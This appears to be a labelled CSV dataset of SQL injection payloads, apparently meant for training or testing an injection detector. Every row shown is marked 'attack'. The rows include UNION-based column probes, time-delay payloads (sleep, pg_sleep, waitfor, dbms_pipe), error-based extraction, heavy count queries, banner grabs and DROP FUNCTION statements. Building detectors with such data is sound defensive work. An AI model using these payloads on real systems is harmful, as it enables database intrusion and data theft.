sentence,attack_type_code,attack_type,len_payload
""" AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   ) ",1,attack,257
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1,attack,37
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND  ( 'kwql' = 'kwql",1,attack,67
"1' )  as sjzi where 8242 = 8242 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,attack,149
"1  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  4450 = 4450",1,attack,108
"1"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""rkry"" like ""rkry",1,attack,232
"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,attack,163
"1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'hqqj' = 'hqqj",1,attack,254
1 )  where 2307 = 2307,1,attack,22
"'  )  )   ) ; SELECT DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 89 ) ||CHR ( 83 ) ||CHR ( 99 ) ||CHR ( 67 ) ,5 )  FROM DUAL;-- AND   (  (   ( 'RWYV' = 'RWYV",1,attack,147
"1""  )  )   union all select null--",1,attack,34
"-7255' union all select 2127,2127,2127,2127,2127#",1,attack,49
"1'  )  )   or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'esma' like 'esma",1,attack,146
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 7672 = 7672",1,attack,72
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""hbfr"" like ""hbfr",1,attack,302
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2267 = 2267",1,attack,191
" select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1,attack,54
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",1,attack,75
"UE1kn: select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,attack,98
"1"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""cwwv"" like ""cwwv",1,attack,70
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,304
"-9808' in boolean mode )  union all select 2528,2528,2528,2528,2528,2528,2528--",1,attack,79
"1'  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,attack,51
"1%"" rlike  ( select  ( case when  ( 5135 = 9839 )  then 1 else 0x28 end  )  )   and ""%"" = """,1,attack,91
" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1,attack,73
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""tbcc"" = ""tbcc",1,attack,113
"1', ( select  ( case when  ( 5249 = 9648 )  then 1 else 1/ ( select 0 )  end  )  )  ",1,attack,82
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,157
"1%""  )  )   rlike sleep ( 5 )  and   (  (  ""%"" = """,1,attack,50
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1,attack,318
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""rWRS"" LIKE ""rWRS",1,attack,290
" end and  ( ""xksk"" = ""xksk",1,attack,25
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'npzh' = 'npzh,1,attack,106
"1 )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,attack,45
", ( SELECT  ( CASE WHEN  ( 4055 = 4055 )  THEN 77B4A14B9E00AF083BA8",1,attack,67
select sleep ( 5 )  and   (  (   ( 'qjsc' = 'qjsc,1,attack,49
1  )  )   as myxo where 1759 = 1759 union all select null#,1,attack,58
1'|| ( select 'mwpd' where 2887 = 2887,1,attack,38
"1"" and 5205 = 9975#",1,attack,19
"-8118"" )  where 3561 = 3561 or  ( 8459 = 8459 ) *4906--",1,attack,55
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,259
"-9337 )  union all select 5648,5648,5648,5648,5648#",1,attack,51
"s.,s: select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1,attack,60
"1"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""xsfg"" like ""xsfg",1,attack,134
"1, ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 9693 = 9693,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,attack,198
"1' where 1602 = 1602 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,attack,223
"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'wjwn' = 'wjwn",1,attack,223
if ( 8182 = 3225 )  select 8182 else drop function kpzk--,1,attack,57
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,253
"-8773%'  )  )   )  union all select 8941,8941,8941,8941,8941,8941#",1,attack,66
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'zrGF' = 'zrGF",1,attack,132
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1,attack,114
"' )  UNION ALL SELECT NULL, NULL-- AND  ( 'loeM' = 'loeM",1,attack,56
"select count ( * )  from generate_series ( 1,5000000 ) # fnck",1,attack,61
"1  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  5137 = 5137",1,attack,245
"1'  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( 'zxon' like 'zxon",1,attack,81
"1"" )  as vqkz where 8536 = 8536",1,attack,31
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( ""oiuw"" = ""oiuw",1,attack,131
 select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1,attack,53
"1' )  as nvqk where 3917 = 3917 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,attack,139
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'ADUT' LIKE 'ADUT",1,attack,290
1'|| ( select 'zyvk' from dual where 2072 = 2072,1,attack,48
"-2704"" )  union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,attack,73
"""+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL,NULL,NULL,NULL,NULL,NULL )  %23",1,attack,97
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""YsSD"" LIKE ""YsSD",1,attack,221
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""bxZF"" = ""bxZF",1,attack,254
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""mhCZ"" = ""mhCZ",1,attack,248
"1"" )  as bpmk where 6412 = 6412 union all select null,null,null,null#",1,attack,69
" select * from users where id = '1' union select +\.,@@VERSION -- 1'",1,attack,67
1'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'mfmk' = 'mfmk,1,attack,357
"make_set ( 7729 = 7729,1 ) ",1,attack,26
"1  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,attack,196
"1""  )  )   union all select null,null,null,null,null,null,null--",1,attack,64
""" ) ; IF ( 3509 = 3509 )  SELECT 3509 ELSE DROP FUNCTION mjwI;-- ",1,attack,64
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""ORXE"" = ""ORXE",1,attack,120
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'lxoc' = 'lxoc",1,attack,228
"1"" where 2512 = 2512 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,attack,132
"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,attack,88
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND  ( 'pZQW' = 'pZQW",1,attack,74
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""qlJI"" LIKE ""qlJI",1,attack,220
 or sleep ( __TIME__ )  = ',1,attack,26
"1' or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'scye' like 'scye",1,attack,236
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""KWUK"" = ""KWUK",1,attack,284
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'Iyno' = 'Iyno",1,attack,246
1\'1,1,attack,4
"1' where 1895 = 1895 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,attack,128
" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1,attack,95
"1%"" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,attack,111
"1'+ ( select dgnt where 4701 = 4701 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,attack,133
'  )  )   AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (  'tDlp' = 'tDlp,1,attack,288
"1' where 9605 = 9605 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1,attack,182
'; BEGIN USER_LOCK.SLEEP ( 5 ) ; END;-- AND 'MBQy' = 'MBQy,1,attack,58
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'zhNS' = 'zhNS",1,attack,263
noon&: select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1,attack,60
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""cuzi"" like ""cuzi",1,attack,148
1' )  where 9175 = 9175,1,attack,23
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""sGYf"" LIKE ""sGYf",1,attack,261
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,86
" )  UNION ALL SELECT NULL, NULL, NULL, NULL#",1,attack,43
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""vAit"" = ""vAit",1,attack,259
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 9730 = 9730",1,attack,324
" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,attack,113
"1', ( select  ( case when  ( 5777 = 5777 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1,attack,118
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""jcQl"" LIKE ""jcQl",1,attack,239
1' )  as qcse where 4147 = 4147 waitfor delay '0:0:5'--,1,attack,55
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""otPr"" = ""otPr",1,attack,335
"1%'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( '%' = '",1,attack,250
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""DMSw"" = ""DMSw",1,attack,265
1' )  and sleep ( 5 )  and  ( 'orxt' = 'orxt,1,attack,44
"1%"" and 9198 = 9198--",1,attack,21
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""TBNW"" = ""TBNW",1,attack,104
"' UNION ALL SELECT NULL, NULL#",1,attack,30
"-9558"" where 7497 = 7497 or  ( 2539 = 6484 ) *6484--",1,attack,52
"-9884' )  or elt ( 1942 = 8409,8409 )  and  ( 'tqdq' like 'tqdq",1,attack,63
-8051 )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 5637 = 5637,1,attack,130
1' in boolean mode )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  #,1,attack,73
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'nJSu' = 'nJSu",1,attack,200
 select * from users where id = 1. <@ or 1 = 1 -- 1,1,attack,50
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1,attack,315
"1"" where 1386 = 1386",1,attack,20
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 1471 = 1471",1,attack,303
"1%""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""%"" = """,1,attack,127
"1%""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""%"" = """,1,attack,70
"1'  )  )   as ovbz where 3203 = 3203  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1,attack,304
 ( SELECT  ( CASE WHEN  ( 2182 = 2182 )  THEN 77B4A14B9E00AF083BA8806DA94B1348 ELSE 2182* ( SELECT 21,1,attack,100
" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1,attack,109
1'|| ( select 'hshf' where 9073 = 9073 and 7533 = 7533 ) ||',1,attack,60
1 where 5311 = 5311 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,attack,83
"1%""  )  )   and sleep ( 5 ) #",1,attack,29
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,194
"1 )  where 3738 = 3738 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,attack,98
"""  )  )  ; IF ( 3509 = 3509 )  SELECT 3509 ELSE DROP FUNCTION mjwI;--",1,attack,69
o..&1: select * from users where id = 1 <@.. or 1 = 1 -- 1,1,attack,58
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'aYnu' = 'aYnu",1,attack,301
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 8692 = 8692",1,attack,254
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'hvxd' LIKE 'hvxd",1,attack,236
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,154
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""RHTP"" = ""RHTP",1,attack,79
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""lvuY"" LIKE ""lvuY",1,attack,146
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 6228 = 6228",1,attack,279
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and 'eznq' like 'eznq",1,attack,79
"1, ( select  ( case when  ( 7734 = 7734 )  then  ( select benchmark ( 5000000,md5 ( 0x72747341  )  )   )  else 7734* ( select 7734 from mysql.db )  end  )  )  ",1,attack,157
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""QCHf"" = ""QCHf",1,attack,353
"' UNION ALL SELECT NULL, NULL, NULL-- AND 'Inid' = 'Inid",1,attack,56
-2411%'  )  )   )  or 6872 = 6872 and   (  (   ( '%' = ',1,attack,56
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,attack,76
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",1,attack,115
